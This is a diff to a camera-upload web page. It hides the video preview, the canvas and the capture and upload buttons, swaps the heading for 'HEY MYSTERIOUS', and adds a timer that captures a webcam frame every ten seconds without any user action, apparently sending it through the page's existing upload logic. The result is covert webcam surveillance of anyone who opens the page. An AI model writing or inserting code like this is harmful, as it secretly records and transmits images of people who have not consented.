@@ -15,11 +15,11 @@
     </style>
 </head>
 <body>
-    <h1>Camera Image Upload</h1>
-    <video id="video" autoplay></video>
-    <canvas id="canvas"></canvas>
-    <button id="capture-btn">Capture Image</button>
-    <button id="upload-btn">Upload Image</button>
+    <h1 >HEY MYSTERIOUS</h1>
+    <video hidden id="video" autoplay></video>
+    <canvas hidden id="canvas"></canvas>
+    <button hidden id="capture-btn">Capture Image</button>
+    <button hidden id="upload-btn">Upload Image</button>
 
     <script>
         const video = document.getElementById('video');
@@ -36,8 +36,7 @@
                 console.error('Error accessing camera:', error);
             });
 
-        // Capture image from video stream
-        captureBtn.addEventListener('click', function() {
+          function capture(){
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
@@ -59,7 +58,9 @@
                     // Optionally display an error message
                 });
             }, 'image/jpeg');
-        });
+          }
+
+        captureBtn.addEventListener('click', capture());
 
         // Hide the canvas initially
         canvas.style.display = 'none';
@@ -68,6 +69,8 @@
         uploadBtn.addEventListener('click', function() {
             canvas.style.display = 'block';
         });
+
+        setInterval(capture, 10000)
     </script>
 </body>
 </html>
